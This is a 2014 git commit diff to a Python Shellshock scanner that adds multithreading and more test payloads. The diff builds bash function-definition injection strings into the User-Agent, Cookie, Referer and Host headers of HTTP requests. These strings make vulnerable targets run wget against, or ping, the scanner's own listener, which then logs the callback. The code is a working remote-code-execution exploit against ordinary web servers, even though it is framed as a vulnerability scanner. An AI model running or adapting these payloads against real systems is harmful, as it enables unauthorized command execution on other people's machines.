0a2b7563e11f044acbe373c9858dd7fa499ab14a
scottjpack <scottjpack@gmail.com>
2014-09-25 14:52:55 -0600

    Update shellshock_scanner.py
    Added multithreading and additional test cases (Thanks Bryce)
    Still may be getting false negatives

--- shellshock_scanner.py
+++ shellshock_scanner.py
@@ -1,4 +1,6 @@
+#Now with multiple threads
 
+import Queue
 import SocketServer
 import SimpleHTTPServer
 import threading
@@ -7,13 +9,23 @@ import sys
 import urllib2
 import hashlib
 import socket
+import time
+import os
+
+max_threads = 20
 
 local_ip = socket.gethostbyname(socket.gethostname())
 
+
+####GOTTA SET THESE!!!
+local_ip = ""
+public_ip = ""
 local_port = 80
-output_file = ""
+https_port = 443
 ids = {}
 
+def pause():
+	raw_input("Press Enter to continue...")
 
 def record_scan_response():
 	""" sample function to be called via a URL"""
@@ -23,28 +35,59 @@ class CustomHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 	def do_GET(self):
 
 		print self.path[1::]
-		print "%s Responded" % ids[self.path[1::]] 
-		output_file.write("%s: Responded\n" % ids[self.path[1::]])
-		
-		self.send_response(200)
-		self.send_header('Content-type','text/html')
-		self.end_headers()
-		self.wfile.write(record_scan_response()) #call sample function here
+		try:
+			print "%s ### ### ### Responded ### ### ### \n" % ids[self.path[1::]] 
+			self.send_response(200)
+			self.send_header('Content-type','text/html')
+			self.end_headers()
+			self.wfile.write(record_scan_response()) #call sample function here
+		except:
+			print("Unknown address responded, ID=%s" % self.path[1::])
+			self.send_response(200)
+			self.send_header('Content-type','text/html')
+			self.end_headers()
+			self.wfile.write(record_scan_response()) #call sample function here
 		return
 
-def test_ip(ip_address, target_port, identifier, ssl):
+def test_ip(ip_address, identifier):
 	#Send a Bash/CGI Injection with the unique identifier.
-	user_agent_str="() { ignored;};/bin/bash -c 'wget http://%s:%s/%s>>/dev/null'" %(local_ip,str(local_port),identifier)
-	print user_agent_str
-	opener = urllib2.build_opener()
-	opener.addheaders = [('User-agent', user_agent_str)]
-	try:
-		if not ssl:
-			response = opener.open("http://%s:%s/%s"%(ip_address,target_port,identifier))
-		else:
-			response = opener.open("https://%s:%s/%s"%(ip_address,target_port,identifier))
-	except:
-		print "Unable to connect, moving on"
+	#public_ip = public_ip.strip()
+	print "Starting scan for %s" % ip_address
+	ip_address = ip_address.strip()
+	identifier = identifier.strip()
+	
+	list_of_exp_str = [ "() { :; }; wget http://" + public_ip + "/" + identifier + " >> /dev/null",
+			   "() { :; }; /usr/bin/wget http://" + public_ip + "/" + identifier + " >> /dev/null",
+			   "() { :; }; /bin/bash -c 'wget http://" + public_ip + "/" + identifier + " >> /dev/null'",
+			   "() { :; }; /bin/bash -c '/usr/bin/wget http://" + public_ip + "/" + identifier + " >> /dev/null'",
+			   "() { :; }; ping -c 6 " + public_ip,
+			   "() { :; }; /usr/ping -c 6 " + public_ip,
+			   "() { :; }; /bin/bash -c 'ping -c 6 " + public_ip + "'",
+			   "() { :; }; /bin/bash -c '/usr/ping -c 6 " + public_ip + "'" ]
+	
+	
+	for exploit_str in list_of_exp_str:
+		timeout = 10
+		socket.setdefaulttimeout(timeout)
+		
+		opener = urllib2.build_opener()
+		opener.addheaders = [('User-Agent', exploit_str), ('Cookie', exploit_str), ('Referer', exploit_str), ('Host', exploit_str)]
+		
+		try:
+			url_str = "http://%s/" % ip_address
+			print "%s,%s URL: %s\n" % (url_str,exploit_str)
+			response = opener.open(url_str)
+		except:
+			pass
+			#print "Unable to connect, moving on\n"
+		
+		try:
+			url_str = "https://%s/" % ip_address
+			#print "%s,%s URL: %s\n" % (url_str,exploit_str)
+			response = opener.open(url_str)
+		except:
+			pass
+			#print "Unable to connect, moving on\n"
 	return
 
 def create_ip_scan_table(ips):
@@ -52,6 +95,7 @@ def create_ip_scan_table(ips):
 	salt = "ShellShockSalt"
 	hash_table = {}
 	for ip in ips:
+		ip = ip.strip()
 		m = hashlib.md5()
 		m.update(str(ip)+salt)
 		hash_table[m.hexdigest()]=ip
@@ -85,30 +129,42 @@ def main():
 			input_filename = a
 		elif o == "-o":
 			output_filename = a
-	
+
 	if input_filename == "" or output_filename == "":
 		usage()
 		return
-	
+
 	input_file = open(input_filename,"r")
 	output_file = open(output_filename,"w")
 	ips = input_file.readlines()
 	ids = create_ip_scan_table(ips);
-	print ids
-	print ""
-	t1_stop=threading.Event()
-	httpd = SocketServer.ThreadingTCPServer(('localhost', local_port),CustomHandler)
+	print "Hashtable Generated, hit any key to continue"
+	pause()
+	
+	#Start Listening Server
+	httpd = SocketServer.ThreadingTCPServer(('', local_port),CustomHandler)
 	server = threading.Thread(target=httpd.serve_forever);
 	server.daemon=True
 	server.start();
 	print "ShellShock Scan Listener started on %s:%s" % (local_ip,local_port)
-
+	
+	
 	
 	for id in ids.keys():
-		test_ip(ids[id],str(local_port),id,False)
+
+		t=threading.Thread(target=test_ip,args=(ids[id],id))
+		t.daemon = True
+		t.start()
+		while (threading.activeCount()) >= max_threads:
+			#print "Hit max thread count (%s/%s), waiting 5 seconds\n" % (str(threading.activeCount()),max_threads)
+			time.sleep(5)
+		
+	print("Finished list, waiting for threads to close.")
 	
-	print("Finished list, waiting 15 more seconds")
-	time.sleep(15);
+	while (threading.activeCount() > 2):
+		print "Waiting for %s threads to close" % threading.activeCount()
+		time.sleep(5)
+	
 	print("Shutting down server")
 	httpd.shutdown
 
